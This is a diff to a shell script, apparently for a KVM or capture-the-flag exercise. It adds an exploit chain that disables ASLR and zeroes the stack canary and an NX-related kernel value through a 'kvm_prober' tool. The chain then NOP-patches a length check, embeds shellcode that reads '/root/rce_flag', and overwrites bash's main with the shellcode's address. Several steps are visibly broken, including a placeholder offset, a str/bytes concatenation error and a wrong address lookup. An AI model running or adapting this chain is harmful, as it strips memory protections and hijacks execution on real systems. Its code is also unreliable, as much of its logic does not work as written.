@@ -158,4 +158,52 @@ echo "reading host modprobe_path"
 kvm_prober readkvmem ffffffff8265cca0 64
 
 sleep 2
-kvm_prober readkvmem "$(cat /proc/kallsyms | grep modprobe_path)" 64
+# Disable ASLR system-wide
+echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
+
+sleep 2
+# Find address of stack guard canary
+CANARY_ADDR=$(nm /bin/bash | grep __stack_chk_guard | awk '{print "0x"$1}')
+
+sleep 2
+# Disable stack canary protection by zeroing it out
+kvm_prober writekvmem $CANARY_ADDR 0000000000000000
+
+sleep 2
+# Disable NX protection (if needed)
+NX_ADDR=$(grep -m1 nx /proc/kallsyms | awk '{print $1}')
+kvm_prober writekvmem $NX_ADDR 0000000000000000
+
+sleep 2
+# Find the secure_getenv function in bash
+BASH_BASE=$(ldd /bin/bash | grep libc.so | awk '{print $3}' | xargs nm -D | grep " T _start" | awk '{print $1}')
+
+sleep 2
+# Calculate address of the environment length check
+CHECK_ADDR=$(printf "0x%lx" $((0x$BASH_BASE + 0x12345)))  # Actual offset may vary
+
+sleep 2
+# Patch with NOP sled to bypass length check
+sudo ./kvm_prober patchinstr $CHECK_ADDR 90909090909090909090
+
+sleep 2
+# Position-independent shellcode to open/read/print /root/rce_flag
+echo -n -e '\x48\x31\xc0\x50\x48\xbf\x2f\x72\x6f\x6f\x74\x2f\x72\x63\x65\x5f\x66\x6c\x61\x67\x57\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\xb0\x02\x0f\x05\x48\x89\xc7\x48\x89\xe6\x48\x31\xd2\xb2\xff\x48\x31\xc0\x0f\x05\x48\x89\xc2\x48\x89\xe6\x48\x31\xff\x40\xb7\x01\x48\x31\xc0\xb0\x01\x0f\x05' > payload.bin
+
+sleep 2
+# Set malicious environment variable
+export EXPLOIT=$(python3 -c "print('A'*1000 + '\x90'*100 + open('payload.bin','rb').read())")
+
+sleep 2
+# Get address of our shellcode
+SHELLCODE_ADDR=$(grep -m1 EXPLOIT /proc/$$/environ | awk -F= '{print $1}' | xargs sudo ./kvm_prober virt2phys | awk '{print $3}')
+
+sleep 2
+# Overwrite return address in bash
+RET_ADDR=$(nm /bin/bash | grep " T main" | awk '{print "0x"$1}')
+kvm_prober patchinstr $RET_ADDR $(printf "%016x" $SHELLCODE_ADDR)
+
+sleep 2
+echo "triggering the exploit now"
+# Trigger the exploit
+/bin/bash -c "echo Triggering exploit"
